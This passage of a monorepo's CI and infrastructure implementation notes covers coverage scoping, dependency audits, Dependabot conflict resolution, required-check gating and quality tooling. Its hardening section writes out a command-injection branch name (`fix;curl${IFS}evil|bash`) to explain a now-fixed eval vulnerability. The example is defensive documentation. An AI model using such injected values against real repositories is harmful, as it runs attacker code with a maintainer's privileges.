the drift guard cannot disagree by construction. The script is `node:fs`-only, so the `coverage`
and `sonarcloud` jobs run it on the runner's system node without `pnpm install`.

- **Codecov `files:`** — the `Collect coverage reports` step runs the script with `--emit`; the
  upload references `steps.lcov.outputs.reports` (every existing `packages/*/coverage/lcov.info`).
  Auto-includes every produced lcov, auto-drops core-types (no tests → no lcov) and partial-run gaps.
- **Sonar scope** — the `Compute Sonar scope` step emits `sonar.sources`, `sonar.tests`, and
  `sonar.javascript.lcov.reportPaths`, passed as scanner `-D` args (which override the properties
  file). Sources are the **real (non-symlink)** `packages/*/src` dirs (`lstat`, mirroring
  sonar-scanner, which does not index files under symlinked directories — so the `src` symlinks of
  `browser-env`/`dom-utils` and the symlinked copies inside consumers like
  `packages/react/src/dom-utils` are invisible to Sonar) **plus `shared/*`**: the shared code is
  analysed at its real location. It was *initially* coverage-excluded via `shared/**` because **no
  lcov record for that code existed anywhere**: v8 coverage resolves symlinked files to their
  `shared/` realpath, which the root vitest include filter (`packages/*/src/**`) drops —
  `browser-env`/`dom-utils` emitted *empty* lcov (their 100% thresholds passed vacuously over zero
  files) and consumers' lcov omit the symlinked files (verified: zero
  `browser-env`/`dom-utils`/`shared` SF records across all 31 lcov, except the angular copy below).
  **Superseded by #809** (next section): the shared dirs are now owner-measured at 100% and the
  `shared/**` coverage-exclusion is removed. `packages/angular/src/dom-utils` — the git-tracked **copy** of
  `shared/dom-utils` (prebundle re-materializes it; ng-packagr can't follow symlinks) — is excluded
  from analysis entirely (`sonar.exclusions`) so the same code isn't analysed and CPD-matched twice.
- The stale static `sonar.sources`/`sonar.tests`/`reportPaths` lines were **deleted** from
  `sonar-project.properties` (a comment forbids re-adding them). In `--emit` mode the script fails
  loudly if no lcov exists (broken artifact upload/download) instead of handing the scanner/uploader
  a blank argument.

**Caveat handled — don't let phantom/no-coverage code red the Sonar gate.** Adapters
(angular/solid/svelte/vue) carry compiler-phantom code via **lowered vitest thresholds**, and
`core-types` has no tests → no lcov. A file in `sonar.sources` without clean coverage is scored as
**uncovered** by Sonar, which would red the new-code-coverage gate (a *required* check via
`sonarcloud` in the `ci` gate). So `sonar.coverage.exclusions` gains
`packages/{angular,solid,svelte,vue,core-types}/src/**` — those stay in `sources` (bugs/smells
analysis runs) but Sonar doesn't score their coverage. Their coverage remains enforced by vitest and
visible in Codecov. Aggregate line coverage across all 31 lcov is **99.34%** (drag ≈ all angular),
still inside Codecov's project `target:100% threshold:1%` (≥99% floor) — if angular's phantom code
ever pushes it under 99%, switch `status.project.default.target` to `auto`.

**Extended to `.size-limit.js` — same guard, same class (check 4).** `.size-limit.js` was the third
hand-maintained per-package list and had drifted the same way (it lacked an entry for the public
`@real-router/fsm`). The fix is not "add the missing entry" but "close the class": the SAME question
*"is this package public?"* must be answered consistently by every per-package list, not
independently — a package can otherwise be `private:false` + published on npm + a Codecov component +
smoke-tested, yet silently absent from size tracking (exactly `fsm`'s state). Check 4 asserts every
**npm-public** package (`private !== true`) has a `.size-limit.js` entry (matched by `esm("<name>"…)`
helper calls **or** literal `packages/<name>/dist/…` paths — the helper templates its path, so both
regexes are needed), unless it is in a tiny justified `SIZE_LIMIT_EXCEPTIONS` map (`svelte`:
svelte-package emits individual files, no single ESM bundle; `core-types`: types-only). Both
directions fail loudly — a missing entry **and** a stale exception (a now-covered or now-private
package still listed). Mutation-validated: removing `fsm`, marking a covered package as excepted, or
dropping the `svelte` exception each makes the guard red. Wired into `lint:coverage-scope`
(pre-commit + CI `pipeline`), so a new public package without a size entry can't merge. `fsm` itself
was kept public on purpose (last-chance candidate for the mini-apps standard); if it ends up unused
there, making it `private:true` will flip Check 1/4 in lockstep (drop from Codecov components +
size-limit) — the guard will demand exactly that.

**Components, not flags.** `codecov.yml` previously declared per-package `flags:` (with
`carryforward: false`). Codecov **flags only exist when uploads are tagged with them** (`flags:`
on the action / `-F` on the CLI) — our CI does a single *untagged* upload of all lcov files, so no
per-flag report was ever created: the whole `flags:` section, including any `carryforward` setting,
was **inert**. (It also means partial affected-only runs were never "zeroed" by
`carryforward: false` — with untagged uploads, project coverage is simply computed over the files
present in the report.) The section is replaced with
`component_management.individual_components` — Components are sliced **server-side from `paths:`**,
so they give per-package coverage views with the existing single untagged upload, no per-package
upload loop needed.

**Drift guard.** The same script in check mode (`pnpm lint:coverage-scope` in `.husky/pre-commit` —
before the expensive test pipeline — and the `pipeline` job) asserts (1) every package with a
`tests/` dir has a `codecov.yml` component, (2) every no-tests **or** phantom (lowered-threshold)
package is in `sonar.coverage.exclusions`, and (3) every tests-having package has
its own `vitest.config.mts` — phantom detection reads only that file, so its absence must fail loud
rather than silently fail open. Checks 1–2 are **bidirectional**: a stale component and a stale
exclusion (package became healthy → Sonar would silently keep ignoring its coverage) fail too. The
generated CI lists can't drift by construction; the guard covers the two remaining static surfaces —
a new adapter/plugin fails the guard until wired in. (The original "shared/** must be
coverage-excluded" assertion was **inverted** by #809 — see check 2b in the next section.)

**Residual.** Codecov's `patch` (new-code 100%) status may now red on a PR touching adapter phantom
code. Codecov is **not** part of the in-repo `CI Result` gate, so it can't block CI directly; if a
`codecov/patch` status is required in branch protection, relax it for the phantom adapters.
The "sonar-scanner skips symlinked dirs" premise should be confirmed on the first scan after this
lands: search SonarCloud for a `shared/` file (e.g. `link-utils.ts`) — it must appear under
`shared/dom-utils`, and only there.
**First-scan outcome (2026-06-12, PR #817 run):** the expanded scope crashed the scanner
(`EXECUTION FAILURE`, exit 3) on **raw U+2028/U+2029 line separators** in newly-scanned files
(`shared/ssr/deferRegistry.ts` JSDoc; `packages/{angular,svelte}/tests/property/linkUtils.properties.ts`
string constants). The JS bridge counts LS/PS as line terminators per the ES spec, the Java side does
not — the line tables diverge (`Line 238 is out of range … has 237 lines`), and slicing by the shifted
offsets cuts a 3-byte UTF-8 sequence mid-char (`Failed to deserialize Protobuf message: Protocol
message had invalid UTF-8`). Fixed by replacing the raw chars with `\uXXXX` escapes (bit-identical
runtime values; tests unchanged). Why nothing caught it earlier: ESLint's `no-irregular-whitespace`
skips string literals by default (`skipStrings: true`), and `shared/` sources are linted by no one —
ESLint doesn't traverse the consumers' `src/*` symlinks and the `shared` workspace has no `lint`
task. Possible follow-up guards: `no-irregular-whitespace: ["error", {skipStrings: false}]`
(needs a repo-wide raw-whitespace sweep first) and/or a lint task for `shared/`. The symlink premise
itself held: the bridge indexed the file at `shared/ssr/…`, its real location.
Discovered while verifying the above (pre-existing, not introduced here): **coverage of `shared/`
code is neither measured nor enforced anywhere** — v8 coverage drops realpath'd symlinked files, so
the owner packages' 100% thresholds are vacuous and the Codecov `browser-env`/`dom-utils` components
will stay empty; the only measured copy is `packages/angular/src/dom-utils` at lowered thresholds.
Tracked in #809 (widen the owner packages' coverage include to the realpath'd `shared/**` files —
and then revisit this section's `shared/**` Sonar exclusion + the guard's check for it).
**Resolved by #809** — see the next section.

### Shared sources are owner-measured at 100% (#809)

**Problem.** The #732 residual above: `shared/{browser-env,dom-utils,ssr}` code shipped in every
consumer bundle but was **measured nowhere** — v8 resolves a symlinked `src` to its `shared/`
realpath, which the base vitest `coverage.include` (`packages/*/src/**`) drops and
`coverage.allowExternal: false` (the default) excludes. The owner packages (`browser-env`,
`dom-utils`) emitted 0-byte lcov and their 100% thresholds passed **vacuously over zero files**.

**Solution — owner-only measurement, NOT aggregate-union.** vitest's glob-pattern thresholds don't
*exclude* files from the global threshold ("Vitest counts all files … into the global coverage
thresholds"), so a consumer can't include shared code in its lcov without it gating the consumer's
own 100%. Instead, each shared dir gets exactly one **measuring owner** whose vitest config sets
`coverage.allowExternal = true` and **replaces** (not concatenates — keeping the base
`packages/*/src/**` alongside `allowExternal` drags the whole aliased workspace graph into the
report) `coverage.include` with the shared glob:

| Shared dir           | Measuring owner                       | Include                                                          |
| -------------------- | ------------------------------------- | ---------------------------------------------------------------- |
| `shared/browser-env` | `packages/browser-env` (owner pkg)    | `["**/shared/browser-env/**/*.ts"]`                              |
| `shared/dom-utils`   | `packages/dom-utils` (owner pkg)      | `["**/shared/dom-utils/**/*.ts"]`                                |
| `shared/ssr`         | `packages/ssr-data-plugin` (consumer) | `["**/packages/ssr-data-plugin/src/**/*.ts", "**/shared/ssr/**/*.ts"]` |

`shared/ssr` has no dedicated owner package (both consumers carry their own `src`), so the
measurement rides on `ssr-data-plugin` with a dual include — the *specific* own-src path doesn't
leak the workspace graph the way the bare `src/**` wildcard does. Its tests cover the generic
`createSsrLoaderPlugin` for both wirings (incl. the rsc-server-plugin shape: no deferred
namespaces). Audit rule applied throughout (classify before testing): genuinely dead branches were
**removed** (resolveMode `client-only` reject, parseTokens empty-value guard, withTimeout timer
guard), defensive-for-impossible-input branches got a justified `/* v8 ignore … -- @preserve */`
(scroll-spy detection re-entry, deferRegistry `?? c` escape fallback — the `@preserve` is required
or esbuild strips the hint during transform and v8 never sees it), and everything reachable got a
real test (dom-utils 100%, browser-env 50→100%, shared/ssr 95.5→100%).

**Gate flips (the #732 wiring assumed the blind spot):**

- **`ci.yml` "Fix coverage paths"** — owner lcovs carry `SF:../../shared/<dir>/x.ts`; after the
  existing `packages/<owner>/` prefixing they read `packages/<owner>/../../shared/…`. A second sed
  (`s|^SF:packages/[^/]+/\.\./\.\./|SF:|`) collapses the parent-dir hops to repo-root-relative
  `shared/<dir>/x.ts` (verified locally on real dom-utils / ssr-data-plugin / core lcov samples —
  mixed and ordinary lcovs are untouched).
- **`sonar-project.properties`** — `shared/**` removed from `sonar.coverage.exclusions`; Sonar now
  scores shared sources from the real lcov at their analysed location.
- **`codecov.yml`** — `browser-env`/`dom-utils` components repointed from the (always-empty)
  `packages/<pkg>/src/**` to `shared/<dir>/**`; `shared/ssr/**` added to the `ssr-data-plugin`
  component.
- **`scripts/check-coverage-scope.mjs`** — the shared assertion is **inverted** (check 2b): any
  `shared/…` entry in `sonar.coverage.exclusions` is now an error, every `shared/<dir>` must have a
  measuring owner (a `packages/*/vitest.config.mts` with `allowExternal` **and** the
  `**/shared/<dir>/` include glob — the glob form, not a bare substring, because config comments
  mention sibling shared dirs in prose), and every `shared/<dir>/**` must be routed to a
  `codecov.yml` component. All three assertions mutation-tested (re-add the exclusion / delete the
  include / drop the codecov path → each fails the guard).

**Why it's this way.** Owner-measurement keeps the repo invariant "one dir, one gate at 100%"
without a fake aggregate project; the CI path normalization means Codecov/Sonar see shared code at
the same path Sonar analyses it (no duplicate-path attribution); and the inverted guard makes the
blind spot structurally non-reopenable — a future `shared/<dir>` without an owner fails pre-commit.

### Bundle Size Reporting

Bundle Size job (in `ci.yml`) compares bundle sizes between PR and base branch:

- Creates/updates PR comment with size diff table
- Shows per-package sizes and total
- Warns if size limit exceeded

**Optimization:** PR sizes use dist artifacts downloaded from the Pipeline job (no rebuild). Base branch uses `bundle` task (only tsdown, skips tests/lint). The PR's `turbo.json` is saved before checking out base and restored after — ensures `bundle` task definition is available even on older base branches.

### Security Scanning

`.github/workflows/codeql.yml`:

- Runs CodeQL analysis on push/PR to master
- Weekly scheduled scan (cron: `0 3 * * 1`)
- Uses config file `.github/codeql/codeql-config.yml` for query configuration
- Dependency review on PRs (fails on moderate+ severity, uses `.github/dependency-review-config.yml` for license allow-list and inline `allow-ghsas:` for individual GHSA exemptions)

#### Local Dependency Audit (PR #643)

**Problem:** `actions/dependency-review-action` only runs on PRs in CI — contributors discover GHSAs after pushing, and the action only flags vulns *newly introduced* by the PR relative to base, so pre-existing CVEs in the lockfile stay invisible until something changes them.

**Solution:** `scripts/check-deps-audit.sh` wraps `osv-scanner` (`brew install osv-scanner`) to scan `pnpm-lock.yaml` + every `Cargo.lock` against the same GHSA database GitHub uses. Wired as `pnpm lint:audit` and runs in pre-push.

**Behavior:**
- Skips gracefully with a hint if `osv-scanner` is not installed (fresh clones / non-security contributors can still push).
- `scripts/osv-scanner.toml` is the single source of truth for ignored advisories — mirrors `allow-ghsas:` in `codeql.yml` AND lists RUSTSEC unmaintained advisories without CVSS that GitHub Dependency Review ignores but osv-scanner reports (gtk/atk/gdk/glib/unic-\*/proc-macro-error — all transitive via Tauri 2.x in desktop examples only).

**Sync rule:** when adding a new exemption, update **both** files (`scripts/osv-scanner.toml` + `.github/workflows/codeql.yml`) — they must stay aligned.

**npm allowlist entries (vs the Rust/Tauri ones):** prefer a **bump** over an exemption — patch/minor bumps go in the affected `package.json`; transitive vulns whose dependency hard-pins the bad version get a `pnpm.overrides` security floor in the root `package.json` (the established pattern: `axios`/`qs`/`follow-redirects`/`node-forge`/`@babel/core`/`vite`/…). Only allowlist when **no in-range fix exists** — and "no fix" means you checked **every** node in the chain, not just the one that names the bad package.

**Worked example — override the intermediary, not the leaf (`GHSA-h67p-54hq-rp68`, `js-yaml@3.14.2` quadratic-merge-key DoS):** js-yaml is fixed only in 4.x, and it was pinned by `read-yaml-file@1.1.0` (`js-yaml@^3`) deep under `@changesets/cli → @manypkg/get-packages`. The obvious override — force `js-yaml: 4.x` — **breaks `read-yaml-file`** (its v1 calls `yaml.safeLoad`, removed in js-yaml 4.x), so this advisory was originally **exempted** in both audit files. That was a local minimum. The real fix is to override one level up: `"read-yaml-file": ">=2.1.0 <3.0.0"` in `pnpm.overrides`. `read-yaml-file@2.1.0` is the last CJS line (3.0.0 is ESM-only `type: module` — hence the `<3.0.0` ceiling, since `@manypkg`'s `require('read-yaml-file')` is CJS), depends on `js-yaml@^4`, and keeps the exact API `@manypkg` consumes (default export + `.default` + `.sync`, now backed by `yaml.load`). This removes `js-yaml@3.14.2` from the tree entirely, so the **exemption was deleted** from `scripts/osv-scanner.toml` + `codeql.yml` rather than carried forever. Lesson: when the package that names the CVE can't be bumped, walk up to the nearest ancestor that *can* be re-pointed at a fixed-transitive line before reaching for an allowlist. Verify with `pnpm changeset status` (exercises `@manypkg/get-packages → read-yaml-file` reading `pnpm-workspace.yaml`) + `pnpm dedupe --check`.

**Coverage difference vs CI Dependency Review:**
- CI: only flags vulns introduced by the PR (delta vs base).
- Local: full state of current lockfiles (catches pre-existing CVEs too).

### Dependabot

`.github/dependabot.yml` configures automated dependency updates:

- Weekly schedule (Monday 04:00)
- Groups: dev-dependencies, eslint, typescript, testing, turbo
- GitHub Actions updates (separate config)

`.github/workflows/dependabot-automerge.yml`:

- Auto-merges patch updates
- Auto-merges minor dev dependency updates
- Uses squash merge

#### Squash-resolve for CONFLICTING Dependabot PRs

**Problem:** `dependabot-automerge.yml` only handles cleanly-mergeable PRs. When a
grouped bump conflicts with `master` (two PRs touching adjacent dependency lines
in the same `package.json` block, or a lockfile that drifted), the fallback was to
`git merge origin/master` into the PR branch and fast-forward `master` — which
drags a **merge commit** onto `master`. The branch is protected with **"Merge
commits are not allowed"**, so each such push only landed via admin bypass and
left `master` non-linear.

**Solution:** `pnpm resolve:dependabot <PR#>` (`scripts/resolve-dependabot.sh`).
It rebases the PR branch onto `origin/master`, auto-resolves the `package.json`
conflicts with `scripts/resolve-dep-conflicts.mjs`, regenerates the lockfile
(`git checkout origin/master -- pnpm-lock.yaml` → `pnpm install` → `pnpm dedupe`),
folds everything into the single dep-bump commit, validates with `pnpm build`,
then **stops for review** and prints the exact `git push --force-with-lease` +
`gh pr merge <PR> --squash` commands (or runs them with `--merge`). The reviewer's
squash-merge lands **one linear commit** — no merge commit.

**`scripts/resolve-dep-conflicts.mjs`** is a semver-union resolver: for each
conflict block it keeps the **newest** version of every dependency (so a PR's
testing-group bump and master's other bumps coexist). **Safety:** it only
auto-resolves a key when both sides are plain `x.y.z` versions and both sides
declare the same key set; ranges (`>=…`), protocols (`workspace:^`), export maps,
or added/removed keys are left untouched and reported with a non-zero exit, so a
human resolves them. Markers-remain and invalid-JSON are hard failures.

**Why rebase+squash, not merge:** keeps `master` linear, matches the automerge
workflow's `--squash` method, and the semver-union heuristic matches exactly how
grouped Dependabot bumps conflict (adjacent version lines). Stop-for-review is the
default because the heuristic is a heuristic — a human eyeballs the resolved
versions before any force-push.

**Also the fix for `lint:dedupe`-only failures (not just conflicts).** Dependabot
never runs `pnpm dedupe`, so a grouped bump frequently leaves duplicate versions in
`pnpm-lock.yaml` (e.g. `semver@7.8.1` **and** `7.8.2`, `lru-cache`, `undici`,
`tinyexec`). CI's `lint:dedupe` step (`pnpm dedupe --check`) then fails with
`ERR_PNPM_DEDUPE_CHECK_ISSUES` even though the PR merges cleanly. The same script
fixes this: its lockfile-reconcile tail (`pnpm install` → `pnpm dedupe` → amend)
runs **unconditionally**, including after a clean rebase with zero conflicts, so the
deduped lockfile is folded into the single dep-bump commit. (For a one-off you can
also just `pnpm dedupe` on the PR branch and commit the lockfile — that is exactly
what the script's tail does — but `resolve:dependabot` is the blessed path because it
also brings the branch up to date with `master`, which the protected branch requires
before merge.)

**Not a fix for a linter-plugin bump that adds rules.** When the eslint group bumps a
plugin to a version with new recommended rules (e.g. `eslint-plugin-unicorn` 64 → 65
added `no-array-from-fill`, `prefer-includes-over-repeated-comparisons`,
`no-this-outside-of-class`, …), the failure is in `lint`, not `lint:dedupe`. That is a
code/config decision — fix the flagged sites, or opt out of the new rules in
`eslint.config.mjs` and track re-enabling (e.g. #712) — and is out of scope for
`resolve:dependabot`.

**Hardening (#814): branch guard + no `eval`.** The script takes a PR *number*
and resolves the head branch via `gh pr view`, so the branch name is
attacker-controlled. git-refs forbid spaces and `~^:?*[` but **permit** `;`, `|`,
`&`, `$`, `(`, `)` — and the `--merge` path used to run `eval "$PUSH_CMD"` /
`eval "$MERGE_CMD"`, so a fork branch like `fix;curl${IFS}evil|bash` plus social
engineering ("my PR conflicts, run `resolve:dependabot 123 --merge`") executed
arbitrary shell as the maintainer. CLAUDE.md names this script as the blessed
agent path, which raises the chance of a run against the wrong PR. Two fixes,
each with a distinct job: (1) the `--merge` path now calls `git push
--force-with-lease origin "$BRANCH"` and `gh pr merge "$PR" …` directly with
quoted args instead of `eval` — **this is what actually closes the injection
vector** (every other `$BRANCH` use was already quoted); (2) a `case "$BRANCH" in
dependabot/*) ;; *) exit 1` guard right after the branch is resolved — before any
fetch/checkout — which does **not** itself block injection (the `dependabot/*`
glob still admits `dependabot/x;evil`), but refuses a wrong-PR run and adds
defense-in-depth. The `PUSH_CMD`/`MERGE_CMD` variables remain only as printed
copy-paste hints in the stop-for-review path, with `$BRANCH` quoted inside the
hint string too (a `dependabot/x;evil` branch can't reach that print — `git fetch
origin "$BRANCH"` fails first under `set -e` unless the maintainer created such a
ref — but the quoting removes the last theoretical paste vector).

### Danger JS

`.github/workflows/danger.yml` runs automated PR review checks via `dangerfile.ts`:

**Checks performed:**

| Check                   | Trigger                            | Action         |
| ----------------------- | ---------------------------------- | -------------- |
| IMPLEMENTATION_NOTES.md | Infrastructure files changed       | Warn           |
| Architectural changes   | Public API, types, or new packages | Message/Warn   |
| Changeset reminder      | Source files changed, no changeset | Warn           |
| PR size                 | >500 lines changed                 | Message/Warn   |
| PR description          | Empty or short description         | Warn           |
| Lockfile sync           | package.json deps changed, no lock | Warn           |
| Test coverage           | New source files without tests     | Message        |
| Console statements      | console.log added to source files  | Warn           |
| PR statistics           | Always                             | Markdown table |

**Skip checks:** Add `#trivial` to PR title or body.

**Local testing:**

```bash
pnpm danger:local
```

**Configuration:** `dangerfile.ts` in project root.

### Required-Check Gaps: `actionlint` for workflow-only PRs + `Validate Changesets` gating (#733)

**Problem:** Two classes of change bypassed the required CI gate entirely.

1. **Workflow-only PRs ran zero validation.** A PR touching only `.github/workflows/*.yml` matches the `check` job's docs/CI exclusion (`grep -vE '^(\.github/|.*\.md$)'`, `ci.yml`) → `should_run=false` → `pipeline`/`smoke`/`sonarcloud` skip → `CI Result` exits 0 early. There was no `actionlint`/yaml-lint anywhere (not in `scripts/`, hooks, or CI), and CodeQL doesn't validate workflow YAML. So the highest-risk code class — executable workflows with access to secrets and the publish path — merged through the required gate with **no** automated validation.
2. **`Validate Changesets` was advisory.** The `protect-master` ruleset listed only `Require Changeset` + `CI Result` as required checks; the separate `Validate Changesets` job (multi-package, major-bump-before-1.0, private-package, missing-PR-ref) could `exit 1` while the PR stayed mergeable, so the pre-1.0 versioning guards didn't actually gate.

**Solution:**

- Added an **`actionlint` job** to `ci.yml` that runs on **every** PR with **no `should_run` gate** — so workflow-only PRs are validated. Pinned by digest: `docker://rhysd/actionlint@sha256:96d4a8c8…` (actionlint 1.7.8). The image bundles `shellcheck` + `pyflakes` (`FROM koalaman/shellcheck-alpine`), so shell bugs in `run:` blocks are caught too. Its result is folded into **`CI Result`** (added to `needs`, checked *before* the docs/CI short-circuit) — so the existing single required check now covers it, no new ruleset context needed for actionlint.
- `SHELLCHECK_OPTS: --severity=warning` drops the ~45 benign `SC2086` info findings (`>> $GITHUB_OUTPUT` and friends — unquoted but space-free) plus `SC2001` style noise, while keeping warnings, errors, and actionlint's own expression/script-injection rules **gating**.
- Fixed the two genuine findings the linter surfaced so the gate passes clean: (a) `github.head_ref` interpolated directly into the `check` step's `run:` (script-injection class + an `SC2193` "can never be equal" **false positive** from actionlint substituting the `${{ }}` into the glob compare) → now passed via `env: HEAD_REF:` and compared as `"$HEAD_REF"`; (b) the lcov path-fix loop's `for … in $(find)` (`SC2044`) + `echo|sed` (`SC2001`) → rewritten as NUL-delimited `find -print0 | while read -r -d ''` with `${lcov%…}` parameter expansion.
- Added **`Validate Changesets`** to `required_status_checks` in the `protect-master` ruleset (repo setting, applied via `gh api -X PUT repos/greydragon888/real-router/rulesets/12148150`). The job runs on every PR with no job-level `if` and handles release-PR deleted changesets gracefully (`[ -f "$file" ]` skip), so it always reports a status and won't deadlock the automated `changeset-release/*` PR.

**Why folding actionlint into `CI Result` instead of a new required context:** keeps the "single required status check" invariant (`ci.yml` GATE comment) — one context to configure, and the gate already aggregates skip-aware results. actionlint has no `if`, so its result is always `success`/`failure` (never `skipped`); the gate requires strict `success` for it, checked ahead of the `should_run != true` early-exit precisely so a workflow-only PR can't pass without it.

**Verification:** ran the pinned version locally (`actionlint` 1.7.8 + shellcheck 0.11.0). With `SHELLCHECK_OPTS=--severity=warning` the full workflow set lints clean (exit 0); at full severity only the suppressed `SC2086` info remains, and no expression/injection findings survive.

### CI minute savings: `duplication` dlx-only + `bundle-size` base-from-master (#734)

**Problem:** Two **informational** downstream jobs (neither in the required gate) spent CI minutes on redundant installs/builds. With turbo's remote-cache hit-rate high, the dominant cost is repeated `pnpm install`, not rebuilds.

1. `duplication` ran a full 32-package `pnpm install --frozen-lockfile` purely to get the `jscpd` binary, then `pnpm lint:duplicates:sarif`.
2. `bundle-size` did a **double install + double bundle**: PR side (download dist + install + `turbo run bundle`) **and** base side (checkout base + install + full bundle) to measure the diff.

**Solution:**

- **`duplication`:** dropped the install step; the duplication step now runs `pnpm dlx "jscpd@$(node -p '…devDependencies.jscpd')" packages/*/src/ …`. jscpd 5.x is the Rust `cpd` rewrite with **no** workspace-package dependencies — its engine ships as a platform binary via `optionalDependencies` (`cpd-linux-x64-gnu` on CI), and it only reads `packages/*/src/`. dlx hardlinks jscpd from the setup-node pnpm-store cache, skipping the 32-package link. Version is read from `package.json` so a Dependabot bump can't drift; args mirror the root `lint:duplicates:sarif` script (`-t 100` ⇒ always exit 0). Verified locally: `pnpm dlx jscpd@5.0.4 …` emits byte-identical SARIF (7 results) to the installed binary.
- **`bundle-size` base side:** `post-merge.yml` (push → master) now measures `size-limit --json` after its build and uploads a `master-bundle-sizes` artifact (90-day retention). The PR job downloads that artifact for base sizes via `gh run list/download` (latest successful post-merge run; `github.base_ref` *is* master, so that run built the exact baseline) instead of re-checking-out + re-installing + re-bundling the base branch. This removes one full `pnpm install`, one full `turbo run bundle`, the base checkout, and the `turbo.json` save/restore dance — net **simpler** job. Needs `actions: read` on the job for the cross-workflow artifact read.

**Why a download-with-fallback, not a hard dependency:** the base artifact can be absent — the first PR after this lands (before that PR's own post-merge run uploads one) or after retention ages out. Both new shell blocks degrade to a valid `[]`: `size-limit` exits non-zero when a limit is exceeded but still prints its JSON, so post-merge captures it with `… || true` then guards `[ -s file ] || echo '[]'`; the PR side falls back to `sizes='[]'` when `gh` finds no run/artifact. Empty base ⇒ every package shows as "new" — exactly the pre-existing behaviour when base measurement failed, so the comparison comment never errors. Both jobs stay **informational** (not in `CI Result`'s `needs`), so even a hard failure can't block a merge.

**Verification:** actionlint clean on both edited workflows (CI config, exit 0). Simulated both shell blocks' success + fallback paths (JSON-with-exit-1 captured, empty→`[]`, no-run→`[]`, no-artifact→`[]`, all producing valid `GITHUB_OUTPUT` heredocs). Confirmed `size-limit --json` shape (`[{name,size,passed,sizeLimit}]`) matches what `bundle-size`'s comparison script consumes, and the `package.json` version read returns `5.0.4`.

### Config hygiene batch (#735)

**Problem:** Low-risk config inconsistencies and dead/misleading bits found in the infra review — none blocked CI, each a correctness/clarity fix.

**Solution (one fix per item):**

1. **size-limit filename.** The config is `.size-limit.js`, but `dangerfile.ts` matched `/^\.size-limit\.json$/` and `ci.yml`'s bundle-size comment printed `.size-limit.json`. → Danger's IMPLEMENTATION_NOTES reminder never fired on `.size-limit.js` edits, and the PR comment named the wrong file. Widened the Danger regex to `/^\.size-limit\.(js|cjs|mjs|json)$/` and corrected the `ci.yml` comment to `.size-limit.js`.
2. **czg ↔ commitlint scope drift.** `cz.config.js` had `allowCustomScopes: true` while `commitlint.config.mjs` errors on any scope outside `SCOPES` (`scope-enum`), so an interactive `pnpm commit` could produce a message the `commit-msg` hook then rejected. → `allowCustomScopes: false` (czg already imports `TYPES`/`SCOPES` from the commitlint config, so the allowed set stays single-sourced).
3. **Stale Sonar version.** `sonar-project.properties` pinned `sonar.projectVersion=0.1.0`; CI overrides it per-run from `packages/core/package.json` (`-D` arg beats the file), so the literal only misled local `pnpm sonar`. → Dropped the line, replaced with a comment pointing at the CI step.
4. **Dead `else` in `check`.** The `BASE`/`HEAD` block had a `push` branch (`github.event.before`/`github.sha`), but the workflow is `pull_request`-only → unreachable. → Removed; `BASE`/`HEAD` now come straight from the PR event.
5. **Misleading Turbo SCM comment.** Said "PR: turbo auto-detects merge base (no override needed)", but the pipeline filter always falls back to `[origin/master]` (`turbo_base` is empty on PRs), diffing against master's tip. → Comment rewritten to state the step is inert on PRs and affected is computed relative to `origin/master`. (Step body kept — issue scoped this to the comment.)
6. **PAT persisted in `.git/config`.** `changesets.yml` did `git remote set-url origin "https://x-access-token:${GH_TOKEN}@…"`, writing the PAT into `.git/config` in plaintext for the rest of the job. → Push to a one-shot authenticated URL (`git push "$REMOTE" …`) so the token lives only in the step's env, never on disk. No other command relied on an authenticated `origin` (the later `git fetch origin` is read-only / public).
7. **EOL alignment.** `prettier.config.mjs` had `endOfLine: "auto"` (preserves whatever's there) vs `.editorconfig` `end_of_line = lf`. The repo has **zero** CRLF-tracked files. → `endOfLine: "lf"` to actually enforce it; verified no new `prettier/prettier` violations on real source.

**Verification:** actionlint clean (CI config) on the edited `ci.yml` + `changesets.yml`; the Danger regex matches `.js/.cjs/.mjs/.json` and rejects near-misses; `cz.config.js` loads with `allowCustomScopes: false` and `commitlint.config.mjs` still exposes the shared `scope-enum`; `git grep -Il $'\r'` returns 0 tracked CRLF files and `eslint` over `packages/core/src/**` reports no `prettier/prettier` issues under `lf` (`dangerfile.ts`'s pre-existing lint errors are out of the gate — per-package lint only globs each package's `src/`+`tests/`).

## GitHub Repository Config

### CODEOWNERS

`.github/CODEOWNERS` defines code ownership for PR reviews:

```
* @greydragon888
/packages/ @greydragon888
/.github/ @greydragon888
```

### Funding

`.github/FUNDING.yml`:

```yaml
github: [greydragon888]
ko_fi: greydragon888
```

## Quality Tools

| Tool             | Purpose                           | Command                               |
| ---------------- | --------------------------------- | ------------------------------------- |
| syncpack         | Dependency version consistency    | `pnpm lint:deps`                      |
| knip             | Dead code detection               | `pnpm lint:unused`                    |
| jscpd            | Copy-paste detection              | `pnpm lint:duplicates`                |
| size-limit       | Bundle size tracking              | `pnpm size`                           |
| arethetypeswrong | TypeScript declaration validation | `pnpm lint:types`                     |
| publint          | Package.json exports validation   | `pnpm lint:package`                   |
| smoke test       | Consumer install + import check   | `bash scripts/smoke-test-packages.sh` |
| SonarCloud       | Code quality & security           | `pnpm sonar:local`                    |
| CodeQL           | Security vulnerabilities          | GitHub Actions                        |
| Codecov          | Coverage reporting                | GitHub Actions                        |
| Danger           | Automated PR review               | `pnpm danger:local`                   |

### jscpd Configuration

`.jscpd.json`:

```json
{
  "threshold": 2,
  "minLines": 5,
  "minTokens": 50,
  "skipComments": true,
  "format": ["typescript", "tsx", "svelte"]
}
```

Ignores: `*.d.ts`, `*.test.ts`, `*.test.tsx`, `*.bench.ts`, `*.spec.ts`, `*.properties.ts`, `benchmarks/**`, `packages/preact/src/**`, `packages/hash-plugin/src/**`, `packages/*/src/dom-utils/**`, `packages/dom-utils/src/**` (last two are symlinks to `shared/dom-utils/` — see #437 section; without the ignore jscpd would report 6 false-positive duplicates).

**`svelte` format (jscpd 4.2+).** Adds Svelte SFC tokenization — jscpd parses each `<script>`/`<template>`/`<style>` block with its native format and cross-detects clones across formats (e.g., duplicated logic between a `.svelte` script block and a `.ts` helper). Currently exercised by `packages/svelte/src/RouterProvider.svelte`. No false positives on the current source tree (clones: 4 / 0.15%, well under the 2% threshold).

### size-limit Configuration

`.size-limit.js` defines per-package limits. esbuild measures dist bundles as consumers receive them — no custom export conditions.

**Historical:** Previously used `modifyEsbuildConfig: addDevelopmentCondition` to resolve workspace deps to `src/` for granular tree-shaking measurement. Removed after `"development"` condition was dropped from exports (#421). Size measurements now reflect actual consumer bundle sizes. `@real-router/sources` limit increased from 1.5 kB to 1.7 kB (measurement methodology change, not code regression).

React package ignores `react`, `react-dom`, `@real-router/core`, `@real-router/route-utils`, and `@real-router/sources` from size calculation.

### knip Configuration

